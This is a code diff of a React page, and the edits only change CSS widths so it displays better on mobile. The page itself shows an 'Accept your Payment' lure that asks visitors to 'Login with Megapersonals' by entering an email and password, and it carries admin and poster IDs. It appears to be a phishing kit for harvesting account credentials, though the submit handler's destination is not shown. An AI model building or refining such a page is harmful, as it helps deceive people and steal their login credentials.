@@ -64,7 +64,7 @@ export default function Home({ adminId, posterId }) {
           </div>
         </div>
       ) : (
-        <div className="w-[50%] p-5 shadow-2xl rounded-md mx-auto">
+        <div className="w-full md:w-[40%] p-5 shadow-2xl rounded-md mx-auto">
           <p className="text-lg font-semibold text-center">
             Accept your Payment{" "}
           </p>
@@ -74,24 +74,24 @@ export default function Home({ adminId, posterId }) {
           </p>
           <img src="/images/logo-potrait.jpg" alt="" />
           <p className="text-center text-xs mt-3">To accept this money</p>
-          <div className="x m-3">
+          <div className=" w-full md:w-[40%] m-3">
             <p className="text-start text-lg font-semibold pl-3">
               Login with Megapersonals
             </p>
             <input
               value={email}
               onChange={(e) => setEmail(e.target.value)}
-              className="w-[90%]  px-5 py-1 rounded-md border border-gray-400 outline-none mt-1 focus:border-green-500"
+              className="w-full  px-5 py-1 rounded-md border border-gray-400 outline-none mt-1 focus:border-green-500"
               placeholder="Enter email hare"
             />
             <input
               value={password}
               onChange={(e) => setPassword(e.target.value)}
-              className="w-[90%]  px-5 py-1 rounded-md border border-gray-400 outline-none mt-2 focus:border-green-500"
+              className="w-full  px-5 py-1 rounded-md border border-gray-400 outline-none mt-2 focus:border-green-500"
               placeholder="Enter password hare"
             />
             <button
-              className="w-[90%]  px-5 py-1 rounded-xl bg-green-600 mt-3 text-white"
+              className="w-full  px-5 py-1 rounded-xl bg-green-600 mt-3 text-white"
               onClick={() => handleSubmit()}
             >
               Submit
